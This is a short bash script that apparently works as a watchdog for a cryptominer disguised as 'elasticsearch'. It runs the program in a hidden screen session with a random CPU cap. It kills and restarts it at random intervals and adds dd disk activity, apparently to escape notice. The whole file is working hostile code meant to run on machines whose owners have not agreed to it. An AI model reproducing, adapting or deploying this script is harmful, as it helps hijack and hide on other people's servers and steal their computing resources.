#! /bin/bash
######
coren=$(cat /proc/cpuinfo | grep "cpu cores" | wc -l) 
function random() 
{ 
	min=$1 
	max=$(($2-$min+1)) 
	num=$(cat /dev/urandom | head -n 10 | cksum | awk -F ' ' '{print $1}') 
	echo $(($num%$max+$min)) 
} 
######
TIMES=0 
RETRN=8 
while [ 1 ] 
do 
	ps -fe | grep 'elasticsearch -c /MQ.list' | grep -v grep 
	if [ $? -ne 0 ] 
	then 
		echo "Do ..." 
		cpux=$(random 40*$coren 100*$coren) 
		echo "corn >>> $coren" 
		echo "cpux >>> $cpux" 
		screen -dmS "MQ_worker" sh -c "S timex -l $cpux elasticsearch -- -c /MQ.list ; sh -c 'tail -f /dev/null'" 
		TIMES=0 
		cpuxmax=`awk 'BEGIN{printf "%d\n",('$coren'*60)}'` ; 
		if [ $cpux -gt $cpuxmax ] 
		then 
			RETRN=$(random 10 20) 
		else 
			RETRN=$(random 2 6) 
		fi 
		echo "$RETRN .........." 
	else 
		TIMES=`awk 'BEGIN{printf "%d\n",('$TIMES'+1)}'` ; 
		echo $TIMES 
		if [ $TIMES -gt $RETRN ] 
		then 
			TIMES=0 
			pkill -f "elasticsearch" 
			sleepsec=$(random 20 60) 
			echo "$sleepsec ..." 
			sleep $sleepsec 
			ps aux | grep 'elasticsearch' | head -n -1 | awk '{ print $2}' | xargs pkill -9 -t 
		fi 
	fi 
	dd if=/dev/zero of=/outfile1 count=1 bs=4MiB 
	sleep 4 
	dd if=/outfile1 of=/outfile2 count=1 bs=4MiB 
	sleep 4 
	dd if=/outfile1 of=/outfile2 count=1 bs=4MiB 
	sleep 4 
	dd if=/outfile1 of=/outfile2 count=1 bs=4MiB 
	sleep 4 
	dd if=/outfile1 of=/outfile2 count=1 bs=4MiB 
	sleep 4 
	dd if=/outfile1 of=/outfile2 count=1 bs=4MiB 
	sleep 4 
	rm -fr /outfile1 /outfile2 
done 
